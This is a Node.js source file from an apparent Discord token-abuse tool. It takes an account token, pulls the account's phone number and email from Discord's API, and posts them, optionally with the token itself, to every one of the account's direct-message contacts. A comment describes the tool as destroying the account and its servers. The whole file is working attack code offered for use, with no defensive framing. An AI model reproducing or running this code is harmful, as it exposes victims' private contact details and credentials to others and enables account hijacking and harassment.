const { getheaders, validateToken, colors, chose_Token, clear, input, SlowPrint, sleep } = require('../Settings/common');
const request = require('request');

async function get_friends(headers) {
  return new Promise((resolve, reject) => {
    request.get({ uri: "https://discord.com/api/v9/users/@me/channels", headers: headers, json: true }, function (err, response, body_) {
      if (err) {
        console.log(err);
        reject(err);
      }
      if (response.statusCode === 200) {
        resolve(body_);
      }
    });
  });
}

async function get_email_phone(headers) {
  return new Promise((resolve, reject) => {
    request.get({ uri: 'https://discord.com/api/v9/users/@me', headers: headers, json: true }, function (error, response, body_) {
      if (error) {
        console.log(error);
        reject(error);
      }
      if (response.statusCode === 200) {
        const phone = body_.phone;
        const email = body_.email;
        resolve({ phone, email });
      }
    });
  });
}

async function leak(headers, token_leak, token) {
  const { phone, email } = await get_email_phone(headers);
  const friends = await get_friends(headers);
  let message = {content: `__Leaked this Account__:\n**Phone Number**: ${phone}\n**Email**: ${email}`,}

  if (token_leak === true) {
    message = {
      content: `__Leaked this Account__:\n**Phone Number**: ${phone}\n**Email**: ${email}\n**Token**: ${token}`,
    };
  }

  for (const friend of friends) {
    request.post(
      {
        uri: `https://discord.com/api/v9/channels/${friend.id}/messages`,
        headers: headers,
        json: true,
        body: message,
      },
      function (error, response, body_) {
        if (error) {
          console.log(error);
        }
        if (response.statusCode === 200) {
          console.log(colors.green + "Leaked Account to " + friend.recipients[0].username + colors.reset);
        }
      }
    );
  }
}


async function Main() {
  const all_logo = `
 _______  ___      ___        _______  _______  ___   _  _______  __    _ 
|   _   ||   |    |   |      |       ||       ||   | | ||       ||  |  | |
|  |_|  ||   |    |   |      |_     _||   _   ||   |_| ||    ___||   |_| |
|       ||   |    |   |        |   |  |  | |  ||      _||   |___ |       |
|       ||   |___ |   |___     |   |  |  |_|  ||     |_ |    ___||  _    |
|   _   ||       ||       |    |   |  |       ||    _  ||   |___ | | |   |
|__| |__||_______||_______|    |___|  |_______||___| |_||_______||_|  |__|

#-#-#-#-#-#-#-#-#-#-#-# BY FOR4 : for4. #-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-

Press enter to continue...`;

    await input(all_logo);
    await clear();
    //await SlowPrint(colors.red + "This will do all tasks and will destroy the Account and the guilds it's in also. It will leak phone number, email, and if wanted, token. Please note that this can inform the token user to reset the token making it invalid." + colors.reset);
    await sleep(2000);
    await input("Press enter to continue...");
    await clear();
    const token = await chose_Token();
    await validateToken(token);
    let headers;
    await getheaders(token).then(headers_ => headers = headers_);
    let token_leak;
    const x = await input("Do you want to leak the token? (y/n) ");
    if (x.toLowerCase() === "y") {token_leak = true;} else {token_leak = false}
    await leak(headers, token_leak, token);
}

Main();
